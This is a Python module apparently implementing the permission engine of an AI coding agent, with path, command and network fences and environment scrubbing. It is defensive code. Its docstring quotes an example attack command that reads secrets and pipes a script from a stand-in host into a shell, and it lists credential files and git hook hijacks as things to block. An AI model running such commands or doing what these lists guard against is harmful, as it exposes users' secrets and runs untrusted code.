"""Permission engine: path fence, command fence, domain fence, env scrubbing.

Three things here that the original spec left implicit and that are the
difference between a permission *model* and a permission *theatre*:

1. **Canonicalization before containment.** `Path.relative_to` on an
   unresolved path is trivially defeated by `../../` and by a symlink
   inside the workspace pointing at `~/.ssh`. Every path is resolved with
   `os.path.realpath` first.
2. **Metacharacters are a second command.** An allowlist containing `cat`
   is worth nothing if `cat secrets; curl evil.sh | sh` is allowed to
   reach the shell. Metacharacters are refused by default.
3. **Subprocess env is not inherited.** `run_command` gets a scrubbed
   environment, so `env` / `printenv` cannot exfiltrate the very API keys
   the runtime is holding.
"""

from __future__ import annotations

import fnmatch
import os
import re
import shlex
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Iterable

from wukong.config import PermissionConfig
from wukong.errors import PermissionDenied
from wukong.tools.base import Tool
from wukong.types import Decision, EffectClass

# ---------------------------------------------------------------------------
# sensitive paths: refused even for READ_ONLY, and even if inside a root
# ---------------------------------------------------------------------------

_SENSITIVE_GLOBS = [
    "**/.ssh/**",
    "**/.aws/**",
    "**/.gnupg/**",
    "**/.kube/**",
    "**/.docker/config.json",
    "**/.config/gh/**",
    "**/.config/gcloud/**",
    "**/.npmrc",
    "**/.pypirc",
    "**/.netrc",
    "**/.git-credentials",
    "**/Library/Keychains/**",
    "**/id_rsa*",
    "**/id_ed25519*",
    "**/id_ecdsa*",
    "**/*.pem",
    "**/*.key",
    "**/*.p12",
    "**/*.keystore",
    "**/.env",
    "**/.env.local",
    "**/.env.production",
    "**/.env.prod",
    "**/.env.development",
    "**/credentials.json",
    "**/service-account*.json",
    "**/secrets.yaml",
    "**/secrets.yml",
]

# ...but these are templates, and reading them is the whole point.
_SENSITIVE_EXCEPTIONS = [
    "**/.env.example",
    "**/.env.sample",
    "**/.env.template",
    "**/.env.dist",
    "**/example.env",
    "**/*.pem.example",
]

_ALWAYS_DENIED_ABS = [
    "/etc/shadow",
    "/etc/sudoers",
    "/private/etc/shadow",
    "/private/etc/sudoers",
]

# Absolute system roots that are never writable regardless of config.
_NEVER_WRITE_ABS = [
    "/etc",
    "/System",
    "/usr",
    "/bin",
    "/sbin",
    "/var",
    "/private/etc",
    "/private/var",
    "/Library",
    "/Applications",
    "/opt",
]

# ...except these. `/var/folders` is the per-user temp directory on macOS and
# is where pytest, editors and half the toolchain put their scratch files;
# blocking it makes the fence a false-positive generator. `/var/tmp` is the
# conventional shared scratch space.
_NEVER_WRITE_EXCEPTIONS = [
    "/var/folders",
    "/private/var/folders",
    "/var/tmp",
    "/private/var/tmp",
]

_METACHARS = re.compile(r"[;&|`$()<>{}!*?\[\]~\n\r\\]")

#: Paths the agent may READ but never WRITE, even inside the workspace.
#:
#: These are not "sensitive data" -- reading a hook to see what the project
#: runs is useful. They are *execution vectors*: writing one causes code to
#: run later, outside the approval gate, usually after the agent is gone. The
#: clearest case is a git hook -- write `.git/hooks/pre-commit` and the next
#: `git commit`, by anyone, at any time, runs it with no confirmation.
#:
#: `.git/config` is the same shape through a different door: `core.hooksPath`
#: redirects where hooks are loaded from, `core.pager` / `core.fsmonitor` /
#: `credential.helper` name programs to execute, and `alias.*` injects
#: commands. There is no safe subset to allow, so the file is the unit.
#:
#: Codex CLI reaches the same conclusion with "writable roots", pinning
#: `.git/hooks` read-only for exactly this reason.
_WRITE_PROTECTED_GLOBS = [
    "**/.git/hooks/**",
    "**/.git/config",
    "**/.git/config.*",
    "**/.git/modules/**/config",
]


def _under_any(path: Path, prefixes: list[str]) -> bool:
    text = str(path)
    return any(text == p or text.startswith(p + os.sep) for p in prefixes)


@dataclass(frozen=True)
class Verdict:
    decision: Decision
    reason: str = ""
    #: True when this decision may not be downgraded by a blanket approval.
    #:
    #: `--approve execute_local` and `--yes` turn CONFIRM into ALLOW, which is
    #: the point of them. A *sticky* confirmation says "this specific
    #: invocation is not covered by that", and the only way through is a
    #: human answering this call.
    sticky: bool = False

    @property
    def allowed(self) -> bool:
        return self.decision is Decision.ALLOW

    @property
    def needs_confirmation(self) -> bool:
        return self.decision is Decision.CONFIRM

    @property
    def denied(self) -> bool:
        return self.decision is Decision.DENY


ALLOW = Verdict(Decision.ALLOW)


class PathGuard:
    """Resolves and checks filesystem paths against configured roots."""

    def __init__(self, *, workspace: Path, home: Path, policy: PermissionConfig) -> None:
        self.workspace = Path(os.path.realpath(workspace))
        self.home = Path(os.path.realpath(home))
        self.read_roots = [self._resolve_root(r) for r in policy.fs.read_roots]
        self.write_roots = [self._resolve_root(r) for r in policy.fs.write_roots]
        self.extra_deny = list(policy.fs.extra_deny)
        # The agent's own policy and audit log. Writing either is self-
        # elevation: the config decides what the agent may do, and the
        # database is the record of what it did. Normally both sit outside
        # the workspace and the fence already covers them -- but a workspace
        # set to the home directory would put them inside it, and "the agent
        # can rewrite its own permissions" is not a configuration anyone
        # intends.
        self.write_protected_abs = [
            self.home / "config.toml",
            self.home / "wukong.db",
        ]

    def _resolve_root(self, raw: str) -> Path:
        p = Path(raw).expanduser()
        if not p.is_absolute():
            p = self.workspace / p
        return Path(os.path.realpath(p))

    # -- resolution -------------------------------------------------------
    def resolve(self, raw: str, *, base: Path | None = None) -> Path:
        """Expand, join, and canonicalize. Never returns a relative path."""
        p = Path(str(raw)).expanduser()
        if not p.is_absolute():
            p = (base or self.workspace) / p
        return Path(os.path.realpath(p))

    # -- checks -----------------------------------------------------------
    def is_sensitive(self, path: Path) -> bool:
        text = str(path)
        if _under_any(path, _ALWAYS_DENIED_ABS):
            return True
        if any(fnmatch.fnmatch(text, e) for e in _SENSITIVE_EXCEPTIONS):
            return False
        if any(fnmatch.fnmatch(text, g) for g in _SENSITIVE_GLOBS):
            return True
        if any(fnmatch.fnmatch(text, g) for g in self.extra_deny):
            return True
        return False

    def _contained(self, path: Path, roots: Iterable[Path]) -> bool:
        for root in roots:
            if path == root or root in path.parents:
                return True
        return False

    def check_read(self, raw: str, *, base: Path | None = None) -> Verdict:
        path = self.resolve(raw, base=base)
        if self.is_sensitive(path):
            return Verdict(Decision.DENY, f"refusing to read sensitive path: {path}")
        if not self._contained(path, self.read_roots):
            roots = ", ".join(str(r) for r in self.read_roots)
            return Verdict(Decision.DENY, f"{path} is outside the readable roots ({roots})")
        return ALLOW

    def is_write_protected(self, path: Path) -> str:
        """Why this path may not be written, or "" if it may.

        Separate from `is_sensitive` on purpose: these paths are fine to
        *read*. Denying the read too would stop the agent from inspecting the
        hooks a project runs, which is exactly the kind of thing it should
        look at before changing anything.
        """
        text = str(path)
        if any(text == p or str(path) == str(p) for p in self.write_protected_abs):
            return (
                f"{path} is this agent's own state (config or event log); "
                "writing it would let the agent change its own policy or audit trail"
            )
        if any(fnmatch.fnmatch(text, g) for g in _WRITE_PROTECTED_GLOBS):
            return (
                f"{path} is an execution vector: it runs code later, outside "
                "this approval gate. Edit it yourself if that is what you want."
            )
        return ""

    def check_write(self, raw: str, *, base: Path | None = None) -> Verdict:
        path = self.resolve(raw, base=base)
        if protected := self.is_write_protected(path):
            return Verdict(Decision.DENY, protected)
        if _under_any(path, _NEVER_WRITE_ABS) and not _under_any(
            path, _NEVER_WRITE_EXCEPTIONS
        ):
            return Verdict(Decision.DENY, f"refusing to write into a system location: {path}")
        if self.is_sensitive(path):
            return Verdict(Decision.DENY, f"refusing to write sensitive path: {path}")
        if not self._contained(path, self.write_roots):
            roots = ", ".join(str(r) for r in self.write_roots)
            return Verdict(Decision.DENY, f"{path} is outside the writable roots ({roots})")
        return ALLOW


class CommandGuard:
    """Static analysis of a shell command string. Best-effort, fails closed.

    Three tiers, checked in this order, and the order is the point:

    1. **deny patterns** on the raw text -- unambiguous strings like `rm -rf`;
    2. **forbidden prefixes and flags** on the parsed argv -- invocations whose
       *arguments* turn an ordinary command into a runner;
    3. **the allowlist** -- which commands may run at all.

    Tier 2 exists because tier 3 answers a question about the command's
    *name*, and the risk lives in its arguments. `git` is a safe command;
    `git config core.hooksPath /tmp/evil` writes the file that decides what
    runs on the next commit. `python3` is a safe command; `python3 -c "..."`
    and `python3 script-i-just-wrote.py` are not. An allowlist that only looks
    at the name cannot tell those apart, so "allow `python3`" quietly means
    "allow everything".

    The flag tier covers the cases that are not prefixes: `find . -exec ...`
    puts the danger after the arguments.
    """

    def __init__(self, policy: PermissionConfig) -> None:
        self.allow = [a.strip() for a in policy.shell.allow if a.strip()]
        self.deny_patterns = [re.compile(p) for p in policy.shell.deny_patterns]
        self.allow_metacharacters = policy.shell.allow_metacharacters
        self.forbidden_prefixes = [
            tuple(p.split()) for p in policy.shell.forbidden_prefixes if p.strip()
        ]
        self.forbidden_flags = {f for f in policy.shell.forbidden_flags if f}
        self.confirm_prefixes = [
            tuple(p.split()) for p in policy.shell.confirm_prefixes if p.strip()
        ]
        self.inert_args = set(policy.shell.inert_args)

    @staticmethod
    def _matches_prefix(argv: list[str], parts: tuple[str, ...]) -> bool:
        """Prefix match on argv, accepting `--flag=value` for a `--flag` rule.

        Without the `=` form, `git --config-env=a=b status` slips past a rule
        written as `git --config-env` -- the element is one string, not two,
        and an exact comparison never sees it.
        """
        if len(argv) < len(parts):
            return False
        for index, expected in enumerate(parts):
            actual = argv[index]
            if actual == expected:
                continue
            if index == len(parts) - 1 and actual.startswith(expected + "="):
                continue
            return False
        return True

    def _always_confirm(self, argv: list[str]) -> Verdict | None:
        """Tier 2b: allowed, but never unattended.

        Placed between "forbidden" and "the allowlist" because that is exactly
        what it means: `python3` is on the allowlist so it may run, and it is
        listed here so it may not run *without being asked*. Without this tier
        `--approve execute_local` silently becomes "run arbitrary code
        unattended", which is not what anyone approving a command class meant.
        """
        normalized = [os.path.basename(argv[0]), *argv[1:]]
        for parts in self.confirm_prefixes:
            if self._matches_prefix(normalized, parts):
                rest = argv[len(parts) :]
                if rest and all(arg in self.inert_args for arg in rest):
                    # `python3 --version` reports a version and stops. Asking
                    # about it teaches the user that the prompt is noise.
                    return None
                return Verdict(
                    Decision.CONFIRM,
                    f"`{' '.join(parts)}` can run anything, so it always needs a "
                    "per-call confirmation -- a blanket approval of command "
                    "execution is not a statement about this invocation.",
                    sticky=True,
                )
        return None

    def _forbidden(self, argv: list[str]) -> Verdict | None:
        """Tier 2. `argv[0]` is normalised so `/usr/bin/git` matches `git`."""
        normalized = [os.path.basename(argv[0]), *argv[1:]]
        for parts in self.forbidden_prefixes:
            if self._matches_prefix(normalized, parts):
                return Verdict(
                    Decision.DENY,
                    f"`{' '.join(parts)}` is a blocked command prefix. It can run "
                    "code, or install something that runs later, so a blanket "
                    "approval of command execution is not meant to cover it. Run "
                    "the specific command you need, or ask the user to run this one.",
                )
        for arg in argv[1:]:
            if arg in self.forbidden_flags or arg.split("=", 1)[0] in self.forbidden_flags:
                return Verdict(
                    Decision.DENY,
                    f"{arg!r} is a blocked flag: it makes an otherwise-inert "
                    "command run something else.",
                )
        return None

    def check(self, command: str) -> Verdict:
        text = command.strip()
        if not text:
            return Verdict(Decision.DENY, "empty command")
        for pattern in self.deny_patterns:
            if pattern.search(text):
                return Verdict(
                    Decision.DENY,
                    f"command matches a blocked pattern (/{pattern.pattern}/)",
                )
        if not self.allow_metacharacters:
            found = _METACHARS.search(text)
            if found:
                return Verdict(
                    Decision.DENY,
                    f"shell metacharacter {found.group(0)!r} is not allowed; "
                    "run one command per call, or enable permissions.shell.allow_metacharacters",
                )
        try:
            argv = shlex.split(text)
        except ValueError as exc:
            return Verdict(Decision.DENY, f"could not parse command: {exc}")
        if not argv:
            return Verdict(Decision.DENY, "empty command")

        if forbidden := self._forbidden(argv):
            return forbidden

        if confirm := self._always_confirm(argv):
            return confirm

        if not self.allow:
            return ALLOW
        head = os.path.basename(argv[0])
        joined = " ".join([head, *argv[1:3]])
        for entry in self.allow:
            # `shlex.split`, not `str.split`: an entry may quote an argument
            # that contains a space, and a bare split would cut it in half.
            try:
                entry_head = shlex.split(entry)[0]
            except ValueError:
                entry_head = entry
            if head == os.path.basename(entry_head) or joined.startswith(entry):
                return ALLOW
        return Verdict(
            Decision.DENY,
            f"{head!r} is not on the command allowlist. Allowed: {', '.join(self.allow)}",
        )


# ---------------------------------------------------------------------------
# env scrubbing
# ---------------------------------------------------------------------------

_SECRET_ENV_HINTS = ("KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL", "PASSWD", "AUTH")

_SAFE_ENV_KEYS = {
    "PATH",
    "HOME",
    "USER",
    "LOGNAME",
    "SHELL",
    "TERM",
    "LANG",
    "LC_ALL",
    "TMPDIR",
    "PWD",
    "PYTHONPATH",
    "PYTHONUNBUFFERED",
    "VIRTUAL_ENV",
    "NODE_PATH",
    "COLUMNS",
    "LINES",
}


def scrub_env(
    source: dict[str, str] | None = None,
    *,
    known_secrets: Iterable[str] = (),
    extra_allow: Iterable[str] = (),
    overrides: dict[str, str] | None = None,
) -> dict[str, str]:
    """Build a subprocess environment that cannot leak credentials.

    Allowlist, not denylist: `PATH`/`HOME`/`LANG` and a few Python/Node
    vars survive, everything else is dropped. A denylist here would be
    defeated by any vendor whose key variable is named something we did
    not guess (e.g. `DASHSCOPE_KEY_ID`).
    """
    source = source if source is not None else dict(os.environ)
    allow = _SAFE_ENV_KEYS | set(extra_allow)
    secrets = {s for s in known_secrets if s}

    out: dict[str, str] = {}
    for key, value in source.items():
        if key not in allow:
            continue
        if value in secrets:
            continue
        out[key] = value
    out.setdefault("PATH", "/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin")
    if overrides:
        for key, value in overrides.items():
            if any(hint in key.upper() for hint in _SECRET_ENV_HINTS):
                continue
            out[key] = value
    return out


# ---------------------------------------------------------------------------
# engine
# ---------------------------------------------------------------------------


class PermissionEngine:
    """Combines the effect-class table with the resource-specific fences.

    Order matters: a hard resource fence (sensitive path, system dir)
    denies outright. Otherwise the effect-class default applies, but any
    resource fence may *raise* the severity (e.g. a write outside the
    workspace is at least CONFIRM even if WRITE_LOCAL is set to allow).
    """

    def __init__(
        self,
        policy: PermissionConfig,
        *,
        workspace: Path,
        home: Path,
        cli_approvals: Iterable[EffectClass] = (),
    ) -> None:
        self.policy = policy
        self.paths = PathGuard(workspace=workspace, home=home, policy=policy)
        self.commands = CommandGuard(policy)
        self.network = policy.network
        # Effects the user pre-approved for this run (`--approve execute_local`).
        self.cli_approvals = frozenset(cli_approvals)

    # -- public -----------------------------------------------------------
    def decide(self, tool: Tool, args: dict[str, Any]) -> Verdict:
        effect = tool.spec.effect_class

        # 1. hard resource fences
        fence = self._resource_fence(tool, args)
        if fence.denied:
            return fence

        # 2. explicit tool-level requirement
        base = self.policy.defaults.get(effect, Decision.CONFIRM)
        if tool.spec.requires_confirmation and base is Decision.ALLOW:
            base = Decision.CONFIRM
        if fence.needs_confirmation and base is Decision.ALLOW:
            base = Decision.CONFIRM

        # 3. deny is absolute
        if base is Decision.DENY:
            if effect in self.cli_approvals:
                return Verdict(
                    Decision.CONFIRM,
                    f"{effect.value} is denied by policy; CLI override downgrades it to "
                    "a per-call confirmation",
                )
            return Verdict(Decision.DENY, f"{effect.value} is denied by policy")

        # 4. CLI pre-approval -- unless the fence said this invocation is not
        #    covered by one. `--approve execute_local` means "run commands
        #    without asking each time"; it is not a statement that the agent
        #    may run arbitrary code unattended, and a sticky confirmation is
        #    how the two are kept apart.
        if base is Decision.CONFIRM and effect in self.cli_approvals and not fence.sticky:
            return Verdict(Decision.ALLOW, f"{effect.value} pre-approved on the command line")

        if base is Decision.CONFIRM:
            return Verdict(
                Decision.CONFIRM,
                fence.reason or f"{effect.value} needs confirmation",
                sticky=fence.sticky,
            )
        return ALLOW

    def enforce(self, tool: Tool, args: dict[str, Any]) -> None:
        """Raise PermissionDenied instead of returning a verdict."""
        verdict = self.decide(tool, args)
        if verdict.denied:
            raise PermissionDenied(
                verdict.reason, tool=tool.spec.name, effect=tool.spec.effect_class.value
            )

    def check_url(self, url: str) -> Verdict:
        """Public domain check, used by the HTTP tools to re-check redirect hops."""
        return self._check_domain(url)

    # -- resource fences --------------------------------------------------
    def _resource_fence(self, tool: Tool, args: dict[str, Any]) -> Verdict:
        effect = tool.spec.effect_class

        if tool.spec.name in {"write_file", "apply_patch"}:
            target = args.get("path")
            if isinstance(target, str):
                return self.paths.check_write(target)

        if tool.spec.name == "read_file":
            target = args.get("path")
            if isinstance(target, str):
                return self.paths.check_read(target)

        if tool.spec.name in {"list_directory", "search_files", "file_info"}:
            target = args.get("path") or "."
            if isinstance(target, str):
                return self.paths.check_read(target)

        if tool.spec.name in {"run_command", "run_tests", "run_linter"}:
            command = args.get("command")
            if isinstance(command, str):
                verdict = self.commands.check(command)
                if not verdict.allowed:
                    return verdict
            cwd = args.get("cwd")
            if isinstance(cwd, str):
                return self.paths.check_read(cwd)

        if tool.spec.name in {"http_get", "http_post"}:
            url = args.get("url")
            if isinstance(url, str):
                return self._check_domain(url)

        if effect is EffectClass.NETWORK:
            url = args.get("url")
            if isinstance(url, str):
                return self._check_domain(url)

        return ALLOW

    def _check_domain(self, url: str) -> Verdict:
        from urllib.parse import urlparse

        parsed = urlparse(url)
        if parsed.scheme not in {"http", "https"}:
            return Verdict(Decision.DENY, f"only http(s) is allowed, got {parsed.scheme!r}")
        host = parsed.hostname or ""
        if not host:
            return Verdict(Decision.DENY, f"could not parse a hostname from {url!r}")
        if self.network.allow_all:
            return ALLOW
        for pattern in self.network.allow_domains:
            if fnmatch.fnmatch(host, pattern):
                return ALLOW
        return Verdict(
            Decision.DENY,
            f"host {host!r} is not on the network allowlist "
            f"({', '.join(self.network.allow_domains) or 'empty'}). "
            "Add it under [permissions.network].allow_domains",
        )
